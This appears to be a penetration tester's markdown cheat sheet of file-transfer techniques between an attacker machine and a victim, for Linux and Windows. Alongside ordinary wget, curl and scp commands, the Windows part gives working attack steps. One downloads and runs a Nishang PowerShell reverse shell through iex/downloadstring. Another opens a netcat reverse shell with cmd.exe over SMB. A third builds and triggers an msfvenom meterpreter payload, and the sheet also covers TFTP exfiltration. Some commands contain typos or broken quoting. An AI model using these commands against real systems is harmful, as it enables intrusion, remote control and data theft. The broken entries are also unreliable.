- [Linux](#Linux)
  - [wget](#wget)
  - [curl](#curl)
  - [nc](#nc)
  - [tftp](#tftp)
  - [axel](#axel)
  - [php](#php)
  - [scp](#scp)
  - [ssh](#ssh)
  
- [Windwos](#windows)
  - [FTP](#FTP)
  - [TFTP](#TFTP)
  - [SMB](#SMB)
  - [Nishang](#Nishang)
  - [Netcat](Netcat)
  - [Meterpreter](Meterpreter)
  - [Impacket](Impacket)

## Linux 

### wget
```
wget [url/with/file] -p [local/path]
```
### curl
```
curl -O [url/with/file]
```
### nc
```
nc -lvp [port] > sending.file
```
### tftp

- service atftpd start

### axel
```
transfer file from a FTP or HTTP server through multiple connections.
axel -n 10 --output=axel-test100Mb.db http://speedtest.ftp.otenet.gr/files/test100Mb.db

```

```
Metasploit, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.
```
### php

### scp 

### ssh

#### puts file to the attacking machine
ssh root@[ip] "cat > proof.txt < proof.txt"

#### Get files from the attacking machine
ssh root@[ip] "cat exploit" > "exploit

## Windows 

### HTTP Download file with with PowerShell
#### (new-object System.Net.WebClient).DownloadFile('http://[ip]/file.exe','D:\User\name\Desktop\file.exe')

### FTP 
#### In linux machine install python-pyftpdlib
```
- apt-get install python-pyftpdlib
- python -m pyftdlib -p 21
If you want to grant the anonymous user write access, add the -w flag as well.

On windows
- ftp [linux_ip]
- binary
- get file.exe
```
### TFTP
#### In linux machine strtign the server 
- service atftpd start
```
Metasploit, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.
```
- On windows
- tftp -i [linux_ip] GET file.exe

Exfiltrating files via TFTP is simple as well with the PUT action. The Metasploit server saves them in /tmp by default
- tftp -i linux-ip PUT file.txt

### SMB
- In linux machine, download smbserver.py from impacket project https://github.com/SecureAuthCorp/impacket
```
python smbserver.py ROPNOP /root/shells
```
- In windows machine
```
- dir \\[linux_ip]\ROPNOP
- copy \\[linux_ip]\ROPNOP\file.exe
```

#### Nishang
- git clone [Nishang](https://github.com/samratashok/nishang)
- edit InvokePowerShellTcp.ps1 /nishang/Shells/
paste *Invoke-PowerShellTcp -Reverse -IPAddress [your_ip] -Port [your_port]* on bottom of the file.
- run python HTTP server
  -python -m SimpleHTTPServer 443
  -python3 -m http.server 443
-In the victim shell: 
  powershell iex(new-object net.webclient).downloadstring('http://[your_ip:port]/Invoke-PowerShellTcp.ps1')
  
#### Netcat
- smbserver.py  
git clone [impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)

- create directory (for example test)
cp nc.exe to test

- run smbserver
python smbserver.py test smb

- run local nc
nc -lnvp 443

-In the victim shell
\\[your_ip]\test\nc.exe -e cmd.exe [your_ip]

#### Meterpreter
- create msfvenom payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[you_ip] LPORT=[your_port] -f asp > rs.asp

- use mstfconsole
exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost, lport and run

- execute reverse shell
curl http://10.10.10.5/rs.asp

#### Impacket 
- https://github.com/SecureAuthCorp/impacket
